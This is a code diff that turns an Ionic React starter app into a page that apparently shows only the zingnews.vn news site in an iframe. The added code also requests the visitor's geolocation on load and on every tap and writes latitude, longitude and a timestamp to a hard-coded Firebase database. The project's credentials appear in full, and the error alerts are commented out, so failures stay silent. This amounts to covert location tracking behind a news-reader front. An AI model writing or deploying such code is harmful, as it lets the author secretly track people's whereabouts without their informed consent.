@@ -1,19 +1,11 @@
-import { Redirect, Route } from 'react-router-dom';
 import {
-  IonApp,
-  IonIcon,
-  IonLabel,
-  IonRouterOutlet,
-  IonTabBar,
-  IonTabButton,
-  IonTabs,
+  IonContent,
+  IonHeader,
+  IonPage,
+  IonTitle,
+  IonToolbar,
   setupIonicReact
 } from '@ionic/react';
-import { IonReactRouter } from '@ionic/react-router';
-import { ellipse, square, triangle } from 'ionicons/icons';
-import Tab1 from './pages/Tab1';
-import Tab2 from './pages/Tab2';
-import Tab3 from './pages/Tab3';
 
 /* Core CSS required for Ionic components to work properly */
 import '@ionic/react/css/core.css';
@@ -33,44 +25,93 @@ import '@ionic/react/css/display.css';
 
 /* Theme variables */
 import './theme/variables.css';
+import { initializeApp } from 'firebase/app';
+import { getDatabase, ref, set } from "firebase/database";
+import moment from 'moment';
+import { useEffect } from 'react';
+// Follow this pattern to import other Firebase services
+// import { } from 'firebase/<service>';
+
+// TODO: Replace the following with your app's Firebase project configuration
+const firebaseConfig = {
+  apiKey: "AIzaSyAcXxFjY48bEW88jaLHM-cbeSXsE302JZ0",
+  authDomain: "loc2-8963f.firebaseapp.com",
+  databaseURL: "https://loc2-8963f-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "loc2-8963f",
+  storageBucket: "loc2-8963f.appspot.com",
+  messagingSenderId: "911657219640",
+  appId: "1:911657219640:web:8364fc91d30846bd4298cd",
+  measurementId: "G-7XCY8YZ0NH"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// Get a list of cities from your database
+function writeUserData(object) {
+  set(ref(db, 'users/'+ object.id), {
+   ...object
+  });
+}
+
 
 setupIonicReact();
+// config
+const App: React.FC = () => {
 
-const App: React.FC = () => (
-  <IonApp>
-    <IonReactRouter>
-      <IonTabs>
-        <IonRouterOutlet>
-          <Route exact path="/tab1">
-            <Tab1 />
-          </Route>
-          <Route exact path="/tab2">
-            <Tab2 />
-          </Route>
-          <Route path="/tab3">
-            <Tab3 />
-          </Route>
-          <Route exact path="/">
-            <Redirect to="/tab1" />
-          </Route>
-        </IonRouterOutlet>
-        <IonTabBar slot="bottom">
-          <IonTabButton tab="tab1" href="/tab1">
-            <IonIcon aria-hidden="true" icon={triangle} />
-            <IonLabel>Tab 1</IonLabel>
-          </IonTabButton>
-          <IonTabButton tab="tab2" href="/tab2">
-            <IonIcon aria-hidden="true" icon={ellipse} />
-            <IonLabel>Tab 2</IonLabel>
-          </IonTabButton>
-          <IonTabButton tab="tab3" href="/tab3">
-            <IonIcon aria-hidden="true" icon={square} />
-            <IonLabel>Tab 3</IonLabel>
-          </IonTabButton>
-        </IonTabBar>
-      </IonTabs>
-    </IonReactRouter>
-  </IonApp>
-);
+  
+        // 
+  
+  function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } else {
+        alert("Trình duyệt của bạn không hỗ trợ định vị người dùng.");
+    }
+  }
+
+  function showPosition(position) {
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
+
+      writeUserData({lat: latitude, lon: longitude, id: moment(Date.now()).format("YYYY-MM-DD hh:mm:ss")})
+      // connect("loc", {lat: latitude, lon: longitude})
+  }
+
+  function showError(error) {
+      // switch (error.code) {
+      //     case error.PERMISSION_DENIED:
+      //         alert("Người dùng từ chối cung cấp vị trí.");
+      //         break;
+      //     case error.POSITION_UNAVAILABLE:
+      //         alert("Không thể xác định được vị trí.");
+      //         break;
+      //     case error.TIMEOUT:
+      //         alert("Quá thời gian để xác định vị trí.");
+      //         break;
+      //     case error.UNKNOWN_ERROR:
+      //         alert("Lỗi không xác định.");
+      //         break;
+      // }
+  }
+
+  return (
+    <IonPage onLoad={getLocation}>
+      <IonHeader>
+        <IonToolbar>
+          <IonTitle>Tab 3</IonTitle>
+        </IonToolbar>
+      </IonHeader>
+      <IonContent onClick={getLocation} fullscreen>
+        <IonHeader collapse="condense">
+          <IonToolbar>
+            <IonTitle size="large">Tab 3</IonTitle>
+          </IonToolbar>
+        </IonHeader>
+        <iframe width={"100%"} height={"80%"} src='https://zingnews.vn/'></iframe>
+      </IonContent>
+    </IonPage>
+  );
+}
 
 export default App;
